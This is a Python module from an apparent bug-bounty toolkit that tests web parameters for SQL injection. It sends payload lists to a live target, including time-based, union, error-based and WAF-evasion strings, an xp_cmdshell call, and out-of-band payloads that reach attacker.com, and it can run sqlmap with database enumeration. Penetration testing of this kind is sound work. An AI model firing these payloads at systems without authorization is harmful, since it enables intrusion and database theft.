"""SQL injection testing — 2026 techniques."""

import json
import os
import re
import subprocess
import time
from pathlib import Path
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SQLiFinding:
    """Single SQLi finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class SQLiResult:
    """Complete SQLi assessment result."""
    target: str
    findings: List[SQLiFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# 2026 SQLi Techniques
SQLI_2026_TECHNIQUES = [
    {
        "id": "time_based_blind",
        "name": "Time-Based Blind SQLi",
        "description": "SQLi via conditional time delays",
        "payloads": [
            # MySQL
            "' OR SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5);--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
            # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('timeout /t 5');--",
            # PostgreSQL
            "' OR pg_sleep(5)--",
            "'; SELECT pg_sleep(5);--",
            # Oracle
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            # SQLite (no native sleep, use busy loop)
            "' OR 1=randomblob(500000000)--",
        ],
    },
    {
        "id": "union_based",
        "name": "Union-Based SQLi",
        "description": "SQLi via UNION SELECT statements",
        "payloads": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1 UNION SELECT NULL--",
            "0 UNION SELECT 1,2,3--",
            "-1 UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        ],
    },
    {
        "id": "error_based",
        "name": "Error-Based SQLi",
        "description": "SQLi via database error messages",
        "payloads": [
            # MySQL
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # MSSQL
            "' AND 1=CONVERT(int,@@version)--",
            "';DECLARE @v INT;SELECT @v=CONVERT(int,@@version)--",
            # PostgreSQL
            "' AND 1=CAST((SELECT version()) AS int)--",
            # Oracle
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        ],
    },
    {
        "id": "waf_bypass",
        "name": "WAF Bypass SQLi",
        "description": "SQLi with WAF evasion techniques",
        "payloads": [
            "/**/OR/**/1=1--",
            "'/**/OR/**/'1'='1",
            "%27%20OR%201%3D1--",
            "' OR '1'='1' LIMIT 1--",
            "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
            "' uNiOn SeLeCt NULL--",
            "'%20OR%201=1--",
            "' OR 1=1#",
            "admin'--",
            "' OR ''='",
        ],
    },
    {
        "id": "stacked_queries",
        "name": "Stacked Queries SQLi",
        "description": "SQLi via multiple SQL statements",
        "payloads": [
            "'; SELECT 1;--",
            "'; SELECT @@version;--",
            "'; SELECT table_name FROM information_schema.tables;--",
        ],
    },
    {
        "id": "out_of_band",
        "name": "Out-of-Band SQLi",
        "description": "SQLi via external network requests",
        "payloads": [
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))--",
            "'; EXEC master..xp_dirtree '//attacker.com/share'--",
        ],
    },
]

# Database-specific error patterns
DB_ERROR_PATTERNS = {
    "mysql": [
        "mysql_fetch",
        "mysql_num_rows",
        "Warning: mysql",
        "MySqlException",
        "valid MySQL result",
        "check the manual that corresponds to your MySQL",
    ],
    "mssql": [
        "Microsoft OLE DB",
        "ODBC SQL Server",
        "Unclosed quotation mark",
        "Microsoft SQL Native Client error",
        "mssql_query()",
    ],
    "postgresql": [
        "PostgreSQL",
        "pg_query",
        "PSQLException",
        "valid PostgreSQL result",
        "Npgsql",
    ],
    "oracle": [
        "ORA-",
        "Oracle error",
        "OracleException",
        "quoted string not properly terminated",
        "OCIStmtExecute",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLite.Exception",
        "System.Data.SQLite.SQLiteException",
        "Warning: sqlite",
        "Warning: SQLite3",
    ],
}

# Column count estimation payloads
COLUMN_COUNT_PAYLOADS = [
    "' ORDER BY 1--",
    "' ORDER BY 10--",
    "' ORDER BY 100--",
    "' GROUP BY 1--",
    "' GROUP BY 10--",
]


def test_sqli(
    target: str,
    param: str = "id",
    output_dir: str = "./results",
    techniques: List[str] = None,
) -> SQLiResult:
    """Test for SQL injection with 2026 techniques.

    Args:
        target: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        techniques: Specific techniques to test (None = all)
    """
    result = SQLiResult(target=target)
    os.makedirs(output_dir, exist_ok=True)

    logger.info(f"Testing SQLi on {target}")

    with httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={"User-Agent": "bountykit/0.1 (authorized research)"},
    ) as client:
        # Test time-based blind
        if techniques is None or "time_based_blind" in techniques:
            _test_time_based_blind(client, target, param, result)
        
        # Test union-based
        if techniques is None or "union_based" in techniques:
            _test_union_based(client, target, param, result)
        
        # Test error-based
        if techniques is None or "error_based" in techniques:
            _test_error_based(client, target, param, result)
        
        # Test WAF bypass
        if techniques is None or "waf_bypass" in techniques:
            _test_waf_bypass(client, target, param, result)
        
        # Test stacked queries
        if techniques is None or "stacked_queries" in techniques:
            _test_stacked_queries(client, target, param, result)
        
        # Test for second-order SQLi indicators
        if techniques is None or "second_order" in techniques:
            _test_second_order_indicators(client, target, param, result)
        
        # Detect database type
        db_type = _detect_database(client, target, param)
        if db_type:
            result.findings.append(SQLiFinding(
                category="sqli",
                severity="info",
                title="Database Type Detected",
                description=f"Target appears to be running {db_type.upper()}",
                endpoint=target,
                evidence=f"Detected via error patterns and response analysis",
                remediation="Ensure database-specific protections are in place",
            ))

    # Save results
    output_file = Path(output_dir) / "sqli_results.json"
    _save_results(result, output_file)

    return result


def _test_time_based_blind(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for time-based blind SQL injection."""
    logger.info("Testing time-based blind SQLi...")
    
    time_payloads = [
        ("' OR SLEEP(5)--", 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' OR pg_sleep(5)--", 5),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
    ]
    
    base_url = target.rstrip("/")
    
    for payload, delay in time_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            
            start_time = time.time()
            resp = client.get(url, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed >= delay - 1:  # Allow 1 second tolerance
                result.findings.append(SQLiFinding(
                    category="sqli",
                    severity="critical",
                    title="Time-Based Blind SQL Injection",
                    description=f"Response delayed by {elapsed:.1f} seconds",
                    endpoint=url,
                    payload=payload,
                    remediation="Use parameterized queries, implement input validation",
                ))
        except Exception:
            continue


def _test_union_based(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for union-based SQL injection."""
    logger.info("Testing union-based SQLi...")
    
    union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in union_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for SQL error messages
            error_patterns = [
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "Microsoft OLE DB",
                "ODBC SQL Server",
                "SQLite/JDBCDriver",
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in resp.text.lower():
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="critical",
                        title="Union-Based SQL Injection",
                        description=f"SQL error disclosed: {pattern}",
                        endpoint=url,
                        payload=payload,
                        remediation="Use parameterized queries, disable error display",
                    ))
                    break
        except Exception:
            continue


def _test_error_based(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for error-based SQL injection."""
    logger.info("Testing error-based SQLi...")
    
    error_payloads = [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in error_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for database version in response
            version_patterns = [
                r"mysql.*\d+\.\d+",
                r"postgresql.*\d+",
                r"oracle.*\d+",
                r"sqlite.*\d+",
            ]
            
            for pattern in version_patterns:
                if re.search(pattern, resp.text.lower()):
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="critical",
                        title="Error-Based SQL Injection",
                        description="Database version disclosed via error",
                        endpoint=url,
                        payload=payload[:100],
                        remediation="Use parameterized queries, disable error display",
                    ))
                    break
        except Exception:
            continue


def _test_waf_bypass(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for WAF bypass SQL injection."""
    logger.info("Testing WAF bypass SQLi...")
    
    waf_bypass_payloads = [
        "/**/OR/**/1=1--",
        "'/**/OR/**/'1'='1",
        "%27%20OR%201%3D1--",
        "' OR '1'='1' LIMIT 1--",
        "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        "' uNiOn SeLeCt NULL--",
        "'%20OR%201=1--",
        "' OR 1=1#",
        "admin'--",
        "' OR ''='",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in waf_bypass_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for successful bypass (non-403 response)
            if resp.status_code != 403 and resp.status_code != 200:
                continue
            
            # Check for SQL error indicators
            error_indicators = [
                "sql syntax",
                "mysql",
                "ORA-",
                "PostgreSQL",
                "SQLite",
            ]
            
            for indicator in error_indicators:
                if indicator.lower() in resp.text.lower():
                    result.findings.append(SQLiFinding(
                        category="sqli",
                        severity="high",
                        title="WAF Bypass SQL Injection",
                        description=f"WAF bypass successful with payload",
                        endpoint=url,
                        payload=payload,
                        remediation="Update WAF rules, use parameterized queries",
                    ))
                    break
        except Exception:
            continue


def _test_stacked_queries(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for stacked queries SQL injection."""
    logger.info("Testing stacked queries SQLi...")
    
    stacked_payloads = [
        "'; SELECT 1;--",
        "'; SELECT @@version;--",
        "'; SELECT table_name FROM information_schema.tables;--",
        "1; SELECT 1;--",
        "1; SELECT @@version;--",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in stacked_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check for successful execution (non-error response)
            if resp.status_code in [200, 301, 302]:
                # Check for SQL error indicators
                error_indicators = [
                    "sql syntax",
                    "mysql",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite",
                    "Microsoft OLE DB",
                ]
                
                for indicator in error_indicators:
                    if indicator.lower() in resp.text.lower():
                        result.findings.append(SQLiFinding(
                            category="sqli",
                            severity="critical",
                            title="Stacked Queries SQL Injection",
                            description="Multiple SQL statements can be executed",
                            endpoint=url,
                            payload=payload,
                            remediation="Disable stacked queries, use parameterized queries",
                        ))
                        break
        except Exception:
            continue


def _test_second_order_indicators(client: httpx.Client, target: str, param: str, result: SQLiResult):
    """Test for second-order SQL injection indicators."""
    logger.info("Testing for second-order SQLi indicators...")
    
    # Common second-order injection points
    second_order_indicators = [
        {"path": "/login", "param": "username", "payload": "admin'--"},
        {"path": "/register", "param": "email", "payload": "test@test.com'--"},
        {"path": "/profile", "param": "name", "payload": "test'--"},
        {"path": "/search", "param": "q", "payload": "test'--"},
    ]
    
    base_url = target.rstrip("/")
    
    for indicator in second_order_indicators:
        try:
            url = f"{base_url}{indicator['path']}"
            resp = client.get(url, params={indicator['param']: indicator['payload']})
            
            # Check if payload appears in response (stored XSS/SQLi indicator)
            if indicator['payload'] in resp.text:
                result.findings.append(SQLiFinding(
                    category="sqli",
                    severity="medium",
                    title="Potential Second-Order SQLi",
                    description=f"Payload appears to be stored without sanitization",
                    endpoint=url,
                    payload=indicator['payload'],
                    remediation="Sanitize all user inputs before storage, use parameterized queries",
                ))
        except Exception:
            continue


def _detect_database(client: httpx.Client, target: str, param: str) -> str:
    """Detect database type through error analysis."""
    logger.info("Detecting database type...")
    
    # Payloads that trigger database-specific errors
    detection_payloads = [
        "'",
        "' OR '1'='1",
        "1' AND '1'='1",
        "1 AND 1=1",
    ]
    
    base_url = target.rstrip("/")
    
    for payload in detection_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            text_lower = resp.text.lower()
            
            # Check for database-specific patterns
            for db, patterns in DB_ERROR_PATTERNS.items():
                for pattern in patterns:
                    if pattern.lower() in text_lower:
                        return db
        except Exception:
            continue
    
    return None


def _save_results(result: SQLiResult, output_file: Path):
    """Save results to JSON file."""
    data = {
        "target": result.target,
        "timestamp": result.timestamp,
        "endpoints_tested": result.endpoints_tested,
        "summary": result.summary,
        "findings": [
            {
                "category": f.category,
                "severity": f.severity,
                "title": f.title,
                "description": f.description,
                "evidence": f.evidence,
                "endpoint": f.endpoint,
                "payload": f.payload,
                "remediation": f.remediation,
            }
            for f in result.findings
        ],
    }
    
    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Results saved to {output_file}")


def run_sqlmap(
    url: str,
    param: Optional[str] = None,
    dbs: bool = False,
    output_dir: str = "./results",
    level: int = 1,
    risk: int = 1,
    techniques: Optional[str] = None,
) -> dict:
    """Run SQLMap for SQL injection testing.

    Uses safe, non-destructive payloads only.

    Args:
        url: Target URL with parameter
        param: Specific parameter to test
        dbs: Enumerate databases if True
        output_dir: Output directory
        level: Test level (1-5)
        risk: Risk level (1-3)
    """
    results = {
        "target": url,
        "tool": "sqlmap",
        "vulnerable": False,
        "injections": [],
        "databases": [],
    }

    os.makedirs(output_dir, exist_ok=True)

    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",
        "--random-agent",
        f"--level={level}",
        f"--risk={risk}",
        "--timeout=10",
        "--retries=2",
        "--threads=5",
    ]

    if param:
        cmd.extend(["-p", param])

    if dbs:
        cmd.append("--dbs")

    if techniques and techniques.lower() != "all":
        cmd.extend(["--technique", techniques.upper()])

    logger.info(f"Running SQLMap against {url}...")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        output = result.stdout + result.stderr

        # Check for injection points
        if "is vulnerable" in output.lower() or "injectable" in output.lower():
            results["vulnerable"] = True
            logger.warning("SQL injection found!")

            # Parse injection info
            for line in output.splitlines():
                if "type:" in line.lower() or "payload:" in line.lower():
                    results["injections"].append(line.strip())

        # Parse databases
        if dbs and "available databases" in output.lower():
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("[*]"):
                    db_name = line.replace("[*]", "").strip()
                    if db_name:
                        results["databases"].append(db_name)

        if not results["vulnerable"]:
            logger.info("SQLMap: No SQL injection found")
        else:
            logger.info(f"Found {len(results['injections'])} injection points")

    except FileNotFoundError:
        logger.error("SQLMap is not installed. Run: bountykit setup")
    except subprocess.TimeoutExpired:
        logger.warning("SQLMap scan timed out")

    # Save results
    output_file = Path(output_dir) / "sqlmap_results.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    logger.info(f"Results saved to {output_file}")
    return results
